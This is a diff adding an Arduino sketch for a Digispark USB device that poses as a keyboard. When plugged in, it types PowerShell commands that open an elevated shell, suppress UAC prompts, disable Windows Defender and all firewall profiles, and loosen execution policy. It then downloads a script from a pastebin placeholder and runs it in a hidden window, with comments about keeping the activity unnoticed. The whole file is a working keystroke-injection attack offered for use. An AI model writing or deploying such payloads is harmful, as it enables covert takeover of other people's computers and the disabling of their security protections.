@@ -1,0 +1,46 @@
+#include "DigiKeyboard.h"
+
+/* Init function */
+void setup()
+{
+  DigiKeyboard.update();
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //start run
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs"); //smallest cmd window possible for trying to making it as less noticeable as possible -- cmd /k mode con: cols=15 lines=1
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT); 
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); //start run
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("cd $Env:temp"); //Jumping to temporary dir
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("Set-ItemProperty -Path \"\'REGISTRY::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\'\" -Name ConsentPromptBehaviorAdmin -Value 0");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.println("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.println("New-ItemProperty -Path \"\'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\'\" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("Set-ExecutionPolicy RemoteSigned -Scope CurrentUser");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("Y");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("NetSh Advfirewall set allprofiles state off");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("curl <pastebin link> -o keyboard.ps1");
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.println("Start-Process powershell -WindowStyle Hidden keyboard.ps1");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("exit");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("");
+  DigiKeyboard.delay(500);
+
+  
+}
+
+/* Unused endless loop */
+void loop() {}
